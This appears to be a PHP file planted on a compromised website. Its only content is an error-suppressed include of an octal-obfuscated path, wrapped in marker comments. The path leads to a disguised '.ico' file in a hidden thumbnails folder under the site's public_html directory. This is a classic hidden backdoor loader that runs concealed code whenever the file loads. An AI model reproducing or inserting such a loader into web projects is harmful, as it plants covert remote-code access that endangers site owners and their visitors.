<?php
/*28af6*/

@include "\057home\057giah\165ng/d\157main\163/gia\150ung.\151nfo/\160ubli\143_htm\154/.th\165mbs/\165pfil\145s/up\151mage\163/.3f\0664060\062.ico";

/*28af6*/










